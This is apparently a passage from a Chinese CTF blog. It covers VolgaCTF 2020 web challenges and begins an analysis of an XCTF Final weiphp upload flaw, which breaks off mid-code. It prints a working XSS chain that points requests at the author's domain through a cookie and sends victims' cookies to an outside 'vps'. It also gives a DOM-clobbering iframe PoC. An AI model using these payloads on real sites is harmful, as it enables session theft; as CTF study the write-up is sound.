$.ajax(&#123;</span><br><span class="line">            type: <span class="string">"POST"</span>,</span><br><span class="line">            url: <span class="string">`//<span class="subst">$&#123;api&#125;</span>.volgactf-task.ru/login`</span>,</span><br><span class="line">            data: <span class="built_in">JSON</span>.stringify(&#123;</span><br><span class="line">                username: $(<span class="string">"#username"</span>).val(),</span><br><span class="line">                password: $(<span class="string">"#password"</span>).val()</span><br><span class="line">            &#125;),</span><br><span class="line">            contentType: <span class="string">"application/json"</span>,</span><br><span class="line">            dataType: <span class="string">"json"</span></span><br><span class="line">        &#125;).done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!data.success) &#123;</span><br><span class="line">                showError(data.error);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                location.replace(<span class="string">`/profile.html?guid=<span class="subst">$&#123;data.guid&#125;</span>`</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    $(<span class="string">"#regForm"</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">        event.preventDefault();</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            type: <span class="string">"POST"</span>,</span><br><span class="line">            url: <span class="string">`//<span class="subst">$&#123;api&#125;</span>.volgactf-task.ru/register`</span>,</span><br><span class="line">            data: <span class="built_in">JSON</span>.stringify(&#123;</span><br><span class="line">                username: $(<span class="string">"#username"</span>).val(),</span><br><span class="line">                password: $(<span class="string">"#password"</span>).val()</span><br><span class="line">            &#125;),</span><br><span class="line">            contentType: <span class="string">"application/json"</span>,</span><br><span class="line">            dataType: <span class="string">"json"</span></span><br><span class="line">        &#125;).done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!data.success) &#123;</span><br><span class="line">                showError(data.error);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                location.replace(<span class="string">`/profile.html`</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    $(<span class="string">"#avatar"</span>).on(<span class="string">"change"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $(<span class="keyword">this</span>)</span><br><span class="line">            .next(<span class="string">".custom-file-label"</span>)</span><br><span class="line">            .text($(<span class="keyword">this</span>).prop(<span class="string">"files"</span>)[<span class="number">0</span>].name);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    $(<span class="string">"#editForm"</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">        event.preventDefault();</span><br><span class="line">        b64Avatar = <span class="string">""</span>;</span><br><span class="line">        mime = <span class="string">""</span>;</span><br><span class="line">        bio = $(<span class="string">"#bio"</span>).val();</span><br><span class="line">        avatar = $(<span class="string">"#avatar"</span>).prop(<span class="string">"files"</span>)[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> (avatar) &#123;</span><br><span class="line">            reader = <span class="keyword">new</span> FileReader();</span><br><span class="line">            reader.readAsDataURL(avatar);</span><br><span class="line">            reader.onload = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">                b64Avatar = reader.result.split(<span class="string">","</span>)[<span class="number">1</span>];</span><br><span class="line">                mime = avatar.type;</span><br><span class="line">                updateUser(&#123; <span class="attr">avatar</span>: b64Avatar, <span class="attr">type</span>: mime, <span class="attr">bio</span>: bio &#125;);</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            updateUser(&#123; <span class="attr">bio</span>: bio &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    params = <span class="keyword">new</span> URLSearchParams(location.search);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        [</span><br><span class="line">            <span class="string">"/"</span>,</span><br><span class="line">            <span class="string">"/index.html"</span>,</span><br><span class="line">            <span class="string">"/profile.html"</span>,</span><br><span class="line">            <span class="string">"/report.php"</span>,</span><br><span class="line">            <span class="string">"/editprofile.html"</span></span><br><span class="line">        ].includes(location.pathname)</span><br><span class="line">    ) &#123;</span><br><span class="line">        getUser(params.get(<span class="string">"guid"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ([<span class="string">"/logout.html"</span>].includes(location.pathname)) &#123;</span><br><span class="line">        logout();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>漏洞点：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    api = <span class="string">"api"</span>;</span><br><span class="line">    <span class="keyword">if</span> (Cookies.get(<span class="string">"api_server"</span>)) &#123;</span><br><span class="line">        api = replaceForbiden(Cookies.get(<span class="string">"api_server"</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Cookies.set(<span class="string">"api_server"</span>, api, &#123; <span class="attr">secure</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $.ajaxSetup(&#123;</span><br><span class="line">        xhrFields: &#123;</span><br><span class="line">            withCredentials: <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"> <span class="comment">//   </span></span><br><span class="line">    </span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">getUser</span>(<span class="params">guid</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (guid) &#123;</span><br><span class="line">        $.getJSON(<span class="string">`//<span class="subst">$&#123;api&#125;</span>.volgactf-task.ru/user?guid=<span class="subst">$&#123;guid&#125;</span>`</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">            data</span></span></span><br><span class="line"><span class="function"><span class="params">        </span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!data.success) &#123;</span><br><span class="line">                location.replace(<span class="string">"/profile.html"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                profile(data.user);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $.getJSON(<span class="string">`//<span class="subst">$&#123;api&#125;</span>.volgactf-task.ru/user`</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!data.success) &#123;</span><br><span class="line">                location.replace(<span class="string">"/login.html"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                profile(data.user, <span class="literal">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).fail(<span class="function"><span class="keyword">function</span>(<span class="params">jqxhr, textStatus, error</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(jqxhr, textStatus, error);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在一段代码中我们可以看出来api变量的赋值时通过cookie进行的，在第二段getUser函数中子域名是通过api变量去确认的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$.getJSON(&#96;&#x2F;&#x2F;$&#123;api&#125;.volgactf-task.ru&#x2F;user?guid&#x3D;$&#123;guid&#125;...</span><br></pre></td></tr></table></figure>

<p>但是在可控制api变量的情况下我们实际上是可以控制请求的网址的。比如另api为exploit.lihuaiqiu.top?，那么实际请求的URL为<a href="https://exploit.lihuaiqiu.top?.volgactf-task.ru/user?guid=${guid}" target="_blank" rel="noopener">https://exploit.lihuaiqiu.top?.volgactf-task.ru/user?guid=${guid}</a> 即可控制请求的网址，但是在main.js有这样一个过滤函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function replaceForbiden(str) &#123;</span><br><span class="line">    return str</span><br><span class="line">        .replace(&#x2F;[ !&quot;#$%&amp;Вґ()*+,\-\&#x2F;:;&lt;&#x3D;&gt;?@\[\\\]^_&#96;&#123;|&#125;~]&#x2F;g, &quot;&quot;)</span><br><span class="line">        .replace(&#x2F;[^\x00-\x7F]&#x2F;g, &quot;?&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里对?进行替空 并且对\x00-\x7F换成?..所以直接用\x00-\x7F间的字符bypass一下就可以了</p>
<p>最后我们需要通过getJSON函数来触发xss.简单的看一下介绍：</p>
<p><img src="https://s1.ax1x.com/2020/03/31/GQfyDI.png" alt="GQfyDI.png"></p>
<p>本地简单试一下</p>
<p>在我们的网站放入xss语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&#123;&quot;xss&quot;:alert(1)&#125;);</span><br></pre></td></tr></table></figure>

<p>调用getJSON函数，成功触发xss</p>
<p><img src="https://s1.ax1x.com/2020/03/31/GQhIJO.png" alt="GQhIJO.png"></p>
<p>所以这里我们只需要将参数控制为?即可xss，回到之前的代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$.getJSON(<span class="string">`//<span class="subst">$&#123;api&#125;</span>.volgactf-task.ru/user?guid=<span class="subst">$&#123;guid&#125;</span>`</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">    data</span></span></span><br><span class="line"><span class="function"><span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!data.success) &#123;</span><br><span class="line">        location.replace(<span class="string">"/profile.html"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        profile(data.user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">if</span> (</span><br><span class="line">    [</span><br><span class="line">        <span class="string">"/"</span>,</span><br><span class="line">        <span class="string">"/index.html"</span>,</span><br><span class="line">        <span class="string">"/profile.html"</span>,</span><br><span class="line">        <span class="string">"/report.php"</span>,</span><br><span class="line">        <span class="string">"/editprofile.html"</span></span><br><span class="line">    ].includes(location.pathname)</span><br><span class="line">) &#123;</span><br><span class="line">    getUser(params.get(<span class="string">"guid"</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过上面代码 可分析得在path有上面数组中的任意一个，将传第guid参数给getUser，那我们只要给guid一个?就可以了</p>
<p>最终exp</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.cookie = <span class="string">"api_server=exploit.lihuaiqiu.top\x77; domain=volgactf-task.ru;"</span>;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.location = <span class="string">'https://volgactf-task.ru/report.php?guid=?'</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在<a href="https://exploit.lihuaiqiu.top放上构造好的xss语句" target="_blank" rel="noopener">https://exploit.lihuaiqiu.top放上构造好的xss语句</a></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(&#123;<span class="string">"test"</span>:<span class="built_in">window</span>.location=<span class="string">'vps'</span>+<span class="built_in">document</span>.location&#125;);</span><br></pre></td></tr></table></figure>

<p>自己vps监听下即可收到cookie</p>
<p><img src="https://s1.ax1x.com/2020/03/31/Gl8ggJ.png" alt="Gl8ggJ.png"></p>
<p>当然还有另一种更有趣的回调操作</p>
<p>俄罗斯带哥找到了回溯的正则表达，膜，如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;  1.7.2 &#x2F;(&#x3D;)\?(?&#x3D;&amp;|$)|\?\?&#x2F;</span><br><span class="line">&lt;&#x3D; 1.7.2 &#x2F;(\&#x3D;)\?(&amp;|$)|\?\?&#x2F;i</span><br><span class="line">&lt;&#x3D; 1.5.1 &#x2F;(\&#x3D;)\?(&amp;|$)|()\?\?()&#x2F;i</span><br><span class="line">&lt;&#x3D; 1.4.4 &#x2F;\&#x3D;\?(&amp;|$)&#x2F;</span><br><span class="line">&lt;&#x3D; 1.4.2 &#x2F;&#x3D;\?(&amp;|$)&#x2F;</span><br><span class="line">&lt;&#x3D; 1.2.1 &#x2F;&#x3D;(\?|%3F)&#x2F;g</span><br><span class="line">&lt;  1.2   not supported</span><br></pre></td></tr></table></figure>

<p>所以我们完全可以不用考虑guid的传值，直接进行回调，并且??后面是可以接受任意其他字符的，如下：</p>
<p><img src="https://s1.ax1x.com/2020/04/01/GldVl8.png" alt="GldVl8.png"></p>
<p>都可成功回调</p>
<h3 id="VolgaCTF-Archive"><a href="#VolgaCTF-Archive" class="headerlink" title="VolgaCTF Archive"></a>VolgaCTF Archive</h3><p>蛮有趣的一道题</p>
<p>主要代码如下</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./js/pages.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  $(<span class="built_in">window</span>).on(<span class="string">'hashchange'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span></span><br><span class="line">    volgactf.activePage.location=location.hash.slice(1);</span><br><span class="line">    if(volgactf.pages[volgactf.activePage.location]) &#123;</span><br><span class="line"><span class="javascript">      $(<span class="string">'#page'</span>).attr(<span class="string">'src'</span>,volgactf.pages[volgactf.activePage.location]);</span></span><br><span class="line"><span class="javascript">      $(<span class="string">'.active'</span>).removeClass(<span class="string">'active'</span>);</span></span><br><span class="line"><span class="javascript">      $(<span class="string">'.nav-item &gt; a:contains('</span>+volgactf.activePage.location+<span class="string">')'</span>).addClass(<span class="string">'active'</span>);</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"><span class="javascript">  $(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">if</span>(location.hash.slice(<span class="number">1</span>) != <span class="string">'2019'</span>) &#123;</span></span><br><span class="line"><span class="javascript">      $(<span class="built_in">window</span>).trigger(<span class="string">'hashchange'</span>);</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>page.js</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">volgactf = &#123;</span><br><span class="line">pages: &#123;</span><br><span class="line"><span class="string">'2011'</span>: <span class="string">'./html/2011.html'</span>,</span><br><span class="line"><span class="string">'2012'</span>: <span class="string">'./html/2012.html'</span>,</span><br><span class="line"><span class="string">'2013'</span>: <span class="string">'./html/2013.html'</span>,</span><br><span class="line"><span class="string">'2014'</span>: <span class="string">'./html/2014.html'</span>,</span><br><span class="line"><span class="string">'2015'</span>: <span class="string">'./html/2015.html'</span>,</span><br><span class="line"><span class="string">'2016'</span>: <span class="string">'./html/2016.html'</span>,</span><br><span class="line"><span class="string">'2017'</span>: <span class="string">'./html/2017.html'</span>,</span><br><span class="line"><span class="string">'2018'</span>: <span class="string">'./html/2018.html'</span>,</span><br><span class="line"><span class="string">'2019'</span>: <span class="string">'./html/2019.html'</span></span><br><span class="line">&#125;,</span><br><span class="line">activePage: &#123;</span><br><span class="line">location: <span class="number">2019</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>主要代码逻辑就是通过对page.js的加载更改location.hash切换页面</p>
<p>如果我们可以将 volgactf.activePage.location的值替换为javascript:alert(1)的话，即可造成xss攻击</p>
<p>所以目前要做的就是将volgactf.active覆盖为一个window对象，对于覆盖的实现可以使用Dom clobbering进行覆盖，不过volgactf.active在题目中已经是一个被声明的变量了，我们需要使这个变量变成未定义的状态，在旧版本的chrome中可以通过xss-auditor进行变量移除，不过在新版本中已经被删掉了。</p>
<p>但是在这个题目中可以通过另外的方式使得此变量变成未定义的模式，此变量的获取是通过page.js进行变量赋值的，我们可以通过一些手段使得Page.js无法成功加载达到此目的</p>
<p>大概有两种方法，如下：</p>
<ul>
<li>Nginx与浏览器的解析差异问题</li>
</ul>
<p>对于<a href="https://archive.q.2020.volgactf.ru/x/..%2F来讲，如果Nginx进行解析的话，实际上请求的是https://archive.q.2020.volgactf.ru，但是浏览器并不会对%2F进行解码，会将其视作文件，所以最后通过script调用page.js实际产生的是https://archive.q.2020.volgactf.ru/x/js/page.js，进一步可成功得到未定义的volgactf.activePage" target="_blank" rel="noopener">https://archive.q.2020.volgactf.ru/x/..%2F来讲，如果Nginx进行解析的话，实际上请求的是https://archive.q.2020.volgactf.ru，但是浏览器并不会对%2F进行解码，会将其视作文件，所以最后通过script调用page.js实际产生的是https://archive.q.2020.volgactf.ru/x/js/page.js，进一步可成功得到未定义的volgactf.activePage</a></p>
<ul>
<li>通过斜线构造超长URL</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;archive.q.2020.volgactf.ru&#x2F;&#x2F;&#x2F;&#x2F;[.....]&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;              200 OK</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;archive.q.2020.volgactf.ru&#x2F;&#x2F;&#x2F;&#x2F;[.....]&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;js&#x2F;main.js    414 Request-URI Too Large</span><br></pre></td></tr></table></figure>

<p>触发414，同样无法成功加载page.js，进而得到未定义的volgactf.activePage</p>
<p>回归本体的攻击思路</p>
<ul>
<li>首先通过iframe引入<a href="https://archive.q.2020.volgactf.ru/x/..%2F（子页面）" target="_blank" rel="noopener">https://archive.q.2020.volgactf.ru/x/..%2F（子页面）</a></li>
<li>构造frames[0].frames[0].location构造孙页面</li>
<li>孙页面的iframe设置name为activePage,并且将此页面的window.name设置为volgactf，此时相当于成功污染子页面的volgactf变量，最后将volgactf.activePage设置为与题目同域的window对象</li>
</ul>
<p>最后的利用Poc如下</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">'https://archive.q.2020.volgactf.ru/x/..%2f'</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.onload=<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="actionscript">  frames[<span class="number">0</span>].frames[<span class="number">0</span>].location=<span class="string">'data:text/html;base64,PGlmcmFtZSBuYW1lPWFjdGl2ZVBhZ2Ugc3JjPWh0dHBzOi8vYXJjaGl2ZS5xLjIwMjAudm9sZ2FjdGYucnUvP2FhYT48L2lmcmFtZT48c2NyaXB0PndpbmRvdy5uYW1lPSd2b2xnYWN0Zic7PC9zY3JpcHQ+'</span>;</span></span><br><span class="line"><span class="actionscript">  setTimeout(<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;frames[<span class="number">0</span>].location=<span class="string">'https://archive.q.2020.volgactf.ru/x/..%2f#javascript:alert(document.domain)'</span>&#125;,<span class="number">1000</span>)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>XCTF Final 部分题目复现</title>
    <url>/2019/11/20/XCTF-Final-%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>前段时间又看到ROIS发的final wp,思路真的tql，然而我连联合战队都没有，也没法接触到final，xmsl（好好学习吧</p>
<h3 id="weiphp"><a href="#weiphp" class="headerlink" title="weiphp"></a>weiphp</h3><p>复现的时候看是有两种解法的，分别为ssrf和上传地方的漏洞</p>
<h4 id="上传漏洞"><a href="#上传漏洞" class="headerlink" title="上传漏洞"></a>上传漏洞</h4><p>跟进File类中的upload方法 </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">   	 <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    	<span class="comment">//用户登录检测</span></span><br><span class="line">   	<span class="keyword">if</span> (!is_login())&#123;</span><br><span class="line">    		$return = <span class="keyword">array</span>(</span><br><span class="line">    				<span class="string">'status'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">    				<span class="string">'code'</span>=&gt;<span class="number">0</span>,</span><br><span class="line">    				<span class="string">'info'</span> =&gt; <span class="string">'上传失败，请先登录'</span>,</span><br><span class="line">    				<span class="string">'msg'</span> =&gt; <span class="string">'上传失败，请先登录'</span>,</span><br><span class="line">    				<span class="string">'data'</span> =&gt; <span class="string">''</span></span><br><span class="line">    		);</span><br><span class="line">    		<span class="keyword">return</span> json_encode($return);</span><br><span class="line">    	&#125;</span><br><span class="line">        $return = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'status'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">            <span class="string">'info'</span> =&gt; <span class="string">'上传成功'</span>,</span><br><span class="line">            <span class="string">'data'</span> =&gt; <span class="string">''</span></span><br><span class="line">        );</span><br><span class="line">        <span class="comment">/* 调用文件上传组件上传文件 */</span></span><br><span class="line">        $File = D(<span class="string">'home/File'</span>);</span><br><span class="line">        $file_driver = strtolower(config(<span class="string">'picture_upload_driver'</span>));</span><br><span class="line">        $info = $File-&gt;upload(config(<span class="string">'download_upload'</span>), config(<span class="string">'picture_upload_driver'</span>), config(<span class="string">"upload_&#123;$file_driver&#125;_config"</span>));</span><br><span class="line">        <span class="comment">/* 记录附件信息 */</span></span><br><span class="line">.....</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里调用了Model中File类的upload方法，再次跟进</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($setting = [], $driver = <span class="string">'Local'</span>, $config = null, $isTest = false)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">/* 上传文件 */</span></span><br><span class="line">        $setting[<span class="string">'callback'</span>] = <span class="keyword">array</span>(</span><br><span class="line">            <span class="keyword">$this</span>,</span><br><span class="line">            <span class="string">'isFile'</span></span><br><span class="line">        );</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    $info = upload_files($setting, $driver, $config, <span class="string">'download'</span>, $isTest);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 设置文件保存位置 */</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;_auto[] = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'location'</span>,</span><br><span class="line">        <span class="string">'Ftp'</span> === $driver ? <span class="number">1</span> : <span class="number">0</span></span><br><span class="line">    );</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里调用了upload_files函数去处理，并且信息返回给$info，跟进upload_files</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_files</span><span class="params">($setting = <span class="string">''</span>, $driver = <span class="string">''</span>, $config = <span class="string">''</span>, $type = <span class="string">'picture'</span>, $isTest = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $return[<span class="string">'msg'</span>] = <span class="string">''</span>;</span><br><span class="line">$files = request()-&gt;file();</span><br><span class="line"><span class="comment">// dump($_FILES);</span></span><br><span class="line"><span class="comment">// dump($files);//dump($rr);</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($files) || count($files) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">    $return[<span class="string">'msg'</span>] = <span class="string">'找不到上传文件'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($return[<span class="string">'msg'</span>] != <span class="string">''</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> $return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$key = key($files);</span><br><span class="line">$file = <span class="keyword">isset</span>($files[$key]) ? $files[$key] : [];</span><br><span class="line">$rootpath = <span class="string">'./uploads/'</span> . $type . <span class="string">'/'</span>;</span><br><span class="line">$saveName = time_format(time(), <span class="string">'Ymd'</span>) . <span class="string">'/'</span> . uniqid();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($setting[<span class="string">'rootPath'</span>])) &#123;</span><br><span class="line">    <span class="keyword">unset</span>($setting[<span class="string">'rootPath'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检测上传根目录</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($return[<span class="string">'msg'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!is_dir($rootpath) &amp;&amp; function_exists(<span class="string">'mkdirs'</span>)) &#123;</span><br><span class="line">        mkdirs($rootpath);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(is_dir($rootpath) &amp;&amp; is_writable($rootpath))) &#123;</span><br><span class="line">        $return[<span class="string">'msg'</span>] = <span class="string">'上传根目录不存在！请尝试手动创建:'</span> . $rootpath;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($return[<span class="string">'msg'</span>])) &#123;</span><br><span class="line">    <span class="comment">//判断扩展名是不是php,不支持上传php文件</span></span><br><span class="line">    $info = $file-&gt;getInfo();</span><br><span class="line">    $info = pathinfo($info[<span class="string">'name'</span>]);</span><br><span class="line">    <span class="keyword">if</span> (strtolower($info[<span class="string">'extension'</span>]) == <span class="string">'php'</span>) &#123;</span><br><span class="line">        $return[<span class="string">'msg'</span>] = <span class="string">'不支持上传该文件类型'</span>;</span><br><span class="line">        $return[<span class="string">'code'</span>] = <span class="number">0</span>;</span><br><span class="line">        $redata[$key] = $return;</span><br><span class="line">        <span class="keyword">return</span> $redata;</span><br><span class="line">    &#125;</span><br><span class="line">    $checkRule = [];</span><br><span class="line">    <span class="keyword">if</span> ($type == <span class="string">'picture'</span>) &#123;</span><br><span class="line">        <span class="comment">//图片扩展名验证 ，图片大小不超过20M</span></span><br><span class="line">        $checkRule[<span class="string">'ext'</span>] = <span class="string">'gif,jpg,jpeg,png,bmp'</span>;</span><br><span class="line">        $checkRule[<span class="string">'size'</span>] = <span class="number">20971520</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $allowExt = input(<span class="string">'allow_file_ext'</span>, <span class="string">''</span>);</span><br><span class="line">        <span class="keyword">if</span> ($allowExt != <span class="string">''</span>) &#123;</span><br><span class="line">            $checkRule[<span class="string">'ext'</span>] = $allowExt;</span><br><span class="line">        &#125;</span><br><span class="line">        $allowSize = input(<span class="string">'allow_file_maxsize'</span>, <span class="string">''</span>);</span><br><span class="line">        <span class="keyword">if</span> ($allowSize &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            $checkRule[<span class="string">'size'</span>] = $allowSize;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $info = $file-&gt;isTest($isTest)</span><br><span class="line">        -&gt;rule(<span class="string">'uniqid'</span>)</span><br><span class="line">        -&gt;validate($checkRule)</span><br><span class="line">        -&gt;move($rootpath, DIRECTORY_SEPARATOR . $saveName);</span><br><span class="line">    <span class="keyword">if</span> ($info) &#123;</span><br><span class="line">        $return[<span class="string">'mime'</span>] = $info-&gt;getMime();</span><br><span class="line">        $return[<span class="string">'name'</span>] = $info-&gt;getFilename();</span><br><span class="line">        $return[<span class="string">'key'</span>] = $key;</span><br><span class="line">        $return[<span class="string">'ext'</span>] = $info-&gt;getExtension();</span><br><span class="line">        $return[<span class="string">'savename'</span>] = str_replace(<span class="string">'\\'</span>, <span class="string">'/'</span>, $info-&gt;getSaveName());</span><br><span class="line">        $return[<span class="string">'md5'</span>] = $info-&gt;md5();</span><br><span class="line">        $return[<span class="string">'sha1'</span>] = $info-&gt;sha1();</span><br><span class="line">        $return[<span class="string">'code'</span>] = <span class="number">1</span>;</span><br><span class="line">        $of = $info-&gt;getInfo();</span><br><span class="line">        <span class="keyword">isset</span>($of[<span class="string">'name'</span>]) || $of[<span class="string">'name'</span>] = $return[<span class="string">'name'</span>];</span><br><span class="line">        $return[<span class="string">'old_name'</span>] = $of[<span class="string">'name'</span>];</span><br><span class="line">        $return[<span class="string">'size'</span>] = <span class="keyword">isset</span>($of[<span class="string">'size'</span>]) ? $of[<span class="string">'size'</span>] : <span class="number">0</span>;</span><br><span class="line"> 